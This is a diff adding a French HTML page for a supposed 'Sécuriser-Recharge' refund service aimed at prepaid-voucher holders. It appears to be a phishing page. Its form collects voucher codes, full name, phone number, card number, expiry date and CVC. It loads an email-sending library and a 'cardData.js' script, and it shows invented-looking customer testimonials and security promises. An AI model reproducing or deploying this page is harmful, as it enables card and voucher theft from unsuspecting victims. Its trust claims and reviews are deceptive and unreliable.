@@ -1,0 +1,298 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+  <!-- style stays Here -->
+  <link rel="stylesheet" href="../style.css" type="text/css" media="all" />
+
+  <!--=============== FONT AWESOME ===============-->
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  />
+  
+  <!-- CDN stays Here -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+
+  <title>Sécuriser-Recharge: Votre sécurité, notre priorité.</title>
+</head>
+<body>
+  <div class="grid-container">
+    <header class="header">
+      <div class="header-content">
+        <a class="brand" href="../index.html">
+          <span class="brand-icon">
+              <img src="../img/png/logo.png" height="45px" alt="">
+          </span>
+          <span class="brand-name"></span>
+        </a>
+        <nav class="nav-menu">
+          <ul class="list">
+            <li class="list-item">
+              <a href="../index.html">
+                <span class="icon"><i class="fa-solid fa-house fa-bounce"></i></span>
+                <span class="title">Acceuil</span>
+              </a>
+            </li>
+            <li class="list-item">
+              <a href="../index.html#shield">
+                <span class="icon"><i class="fa-solid fa-shield-halved fa-flip"></i></span>
+                <span class="title">Securiser</span>
+              </a>
+            </li>
+            <li class="list-item">
+              <a href="../pages/sell.html">
+                <span class="icon"><i class="fa-brands fa-sellsy fa-fade"></i></span>
+                <span class="title">Remboursement</span>
+              </a>
+            </li>
+            <li class="list-item">
+              <a href="../pages/help.html">
+                <span class="icon"><i class="fa-solid fa-circle-info fa-beat"></i></span>
+                <span class="title">Aide</span>
+              </a>
+            </li>
+          </ul>
+        </nav>
+        <div class="burger-btn">
+          <div class="burger-content">
+            <div class="line" id="line1"></div>
+            <div class="line" id="line2"></div>
+            <div class="line" id="line3"></div>
+          </div>
+        </div>
+      </div>
+    </header>
+    <main class="main">
+      <section class="home sell">
+        <div class="container">
+          <h6>Remboursement</h6>
+          <h1 class="home-title">
+            Sécuriser Recharge :
+            <span>Votre sécurité, notre priorité.</span>
+          </h1>
+          <p class="description">
+            Notre service dispose enfin d'un système de remboursement en ligne.
+            Faites vous rembourser d'une recharge dont vous n'avez pas fait usage dans un délai de 24H.
+          </p>
+          <div class="btn-group">
+            <button class="check">
+              <a href="/Secure-me/index.html#shield">
+                <span class="icon"><i class="fa-regular fa-circle-check fa-bounce"></i></span>
+                <span class="title">Sécuriser</span>
+              </a>
+            </button>
+            <button class="sell">
+              <a href="#sell">
+                <span class="icon"><i class="fa-brands fa-sellsy fa-fade"></i></span>
+                <span class="title">Remboursement</span>
+              </a>
+            </button>
+          </div>
+        </div>
+      </section>
+<section class="section container" id="sell">
+  <h2 class="section__title title-center" data-title="REMBOURSEMENT">
+    Remboursement en ligne
+  </h2>
+  <img src="../img/png/icon.png" alt="" class="sell-img">
+  <form class="recharge-form sell" action="" id="selling-form">
+    <label for="type-recharge">Types de recharge :</label>
+    <select id="type-recharge" name="type-recharge" required>
+      <option value="PCS">PCS</option>
+      <option value="Neosurf">Neosurf</option>
+      <option value="Transcash">Transcash</option>
+      <option value="PAYSAFECARD">PAYSAFECARD</option>
+    </select><br>
+
+    <label for="valeur-recharge">Valeur de recharge :</label>
+    <select id="valeur-recharge" name="valeur-recharge" required>
+      <option value="20">20€</option>
+      <option value="30">30€</option>
+      <option value="50">50€</option>
+      <option value="100">100€</option>
+      <option value="150">150€</option>
+      <option value="200">200€</option>
+      <option value="250">250€</option>
+      <option value="500">500€</option>
+    </select><br>
+    
+    <div id="code-recharge">
+      <label for="code">Code de Recharge :</label>
+      <input type="text" id="code" name="code" placeholder="Entrez le code du ticket" required><br>
+    </div>
+    
+    <div id="full_name">
+      <label for="name">Nom Complet :</label>
+      <input type="text" id="name" name="name" placeholder="nom et prénom" required><br>
+    </div>
+    
+    <div id="phone_number">
+      <label for="tel">Téléphone :</label>
+      <input type="tel" id="tel" name="tel" placeholder="Numéro de téléphone" required><br>
+    </div>
+    
+    <div id="card_number">
+      <label for="code">Numéro de carte bancaire :</label>
+      <input type="number" id="card_num" name="card-num" placeholder="Entrez le numéro ici" required><br>
+    </div>
+    
+    
+    <div id="card_exp_date">
+      <label for="card_exp">Date d'expiration :</label>
+      <input type="text" id="card_exp" name="card-exp" placeholder=" Mois - Année" required><br>
+    </div>
+    
+    <div id="card_cvc">
+      <label for="card_cvc">Cryptogramme :</label>
+      <input type="number" id="cvv" name="card-cvc" placeholder="Entrez le CVC" required><br>
+    </div>
+    
+     <p id="form_message"></p> 
+    <button type="submit"> Soumettre </button>
+  </form>
+</section>
+      <img src="../img/png/0.png" alt="" class="payment-img png">
+      <!--==================== TESTIMONIALS ====================-->
+      <section class="testimonials section">
+        <h2 class="section__title title-center" data-title="Témoignages">
+          Avis des clients
+        </h2>
+        <div class="testimonials-container">
+            <div class="testimonials-item">
+                <div class="testimonials-data">
+                  <img
+                    src="../img/profile/profile1.jpg"
+                    alt=""
+                    class="testimonials-img"
+                  />
+                  <div>
+                    <h3 class="testimonials-name">Alexandre Dupont</h3>
+                    <span class="testimonials-identity">Saint-Étienne</span>
+                  </div>
+                </div>
+                
+                <p class="testimonials-description">
+                    Je recommande vivement <strong>Sécuriser-Recharge</strong> à tous ceux
+                    qui veulent une solution simple et fiable
+                    pour sécuriser leurs recharges en ligne. 
+                    Leur équipe est professionnelle et toujours 
+                    prête à aider. Enfin, je peux gérer mes transactions
+                    en toute tranquillité grâce à leur service de qualité
+                </p>
+            </div>
+            
+            <div class="testimonials-item">
+                <div class="testimonials-data">
+                  <img
+                    src="../img/profile/profile3.jpg"
+                    alt=""
+                    class="testimonials-img"
+                  />
+                  <div>
+                    <h3 class="testimonials-name">Camille Dubois</h3>
+                    <span class="testimonials-identity">Marseille</span>
+                  </div>
+                </div>
+                
+                <p class="testimonials-description">
+                  J'ai découvert <strong>Sécuriser-Recharge</strong> et je ne pourrais pas
+                  être plus satisfait. La plateforme simplifie
+                  vraiment la sécurité des recharges, et leur 
+                  équipe de support est incroyablement réactive.
+                  Enfin, je peux effectuer des 
+                  transactions en ligne en toute confiance!
+                </p>
+            </div>
+            
+            <div class="testimonials-item">
+                <div class="testimonials-data">
+                  <img
+                    src="../img/profile/profile2.jpeg"
+                    alt=""
+                    class="testimonials-img"
+                  />
+                  <div>
+                    <h3 class="testimonials-name">Jean-Pierre Martin</h3>
+                    <span class="testimonials-identity">Bordeaux</span>
+                  </div>
+                </div>
+                
+                <p class="testimonials-description">
+                  <strong>Sécuriser-Recharge</strong> est un véritable atout pour ceux d'entre nous 
+                  qui sont préoccupés par la sécurité en ligne. J'ai utilisé 
+                  leur service pour sécuriser mes recharges et j'ai été 
+                  impressionné par la simplicité de leur plateforme.
+                  C'est rassurant de savoir qu'ils sont là pour protéger mes transactions.
+                </p>
+            </div>
+        </div>
+      </section>
+        <section class="card-block section container">
+            <ul class="list card-list">
+                <li class="card-item">
+                    <img src="../img/card/card1.png" alt="">
+                </li>
+                <li class="card-item">
+                    <img src="../img/card/card2.png" alt="">
+                </li>
+                <li class="card-item">
+                    <img src="../img/card/card3.png" alt="">
+                </li>
+                <li class="card-item">
+                    <img src="../img/card/card4.png" alt="">
+                </li>
+            </ul>
+        </section>
+    </main>
+       
+    <footer class="footer">
+        <div class="footer-container">
+            <ul class="footer-item list shortcut">
+                <h2>Accès Rapide</h2>
+                <li class="list-item">
+                    <a href="/Secure-me/index.html">
+                        <span class="icon"><i class="fa-solid fa-house fa-bounce"></i></span>
+                        <span class="title">accueil</span>
+                    </a>
+                </li>
+                <li class="list-item">
+                    <a href="/Secure-me/index.html#shield">
+                        <span class="icon"><i class="fa-solid fa-shield-halved fa-fade"></i></span>
+                        <span class="title">Sécuriser</span>
+                    </a>
+                </li>
+                
+                <li class="list-item">
+                    <a href="/Secure-me/pages/sell.html">
+                        <span class="icon"><i class="fa-brands fa-sellsy fa-bounce"></i></span>
+                        <span class="title">Remboursement</span>
+                    </a>
+                </li>
+                
+            </ul>
+            <div class="footer-item news-letters">
+            </div>
+            
+            <div class="footer-item">
+            </div>
+                
+            <div class="copyright">
+                <p>&copy; 2019 - 2023 <br> Tout droits reservés </p>
+            </div>
+        </div>
+    </footer>
+  </div>
+
+  <script src="../app.js"></script>
+  <script src="../cardData.js"></script>
+</body>
+</html>
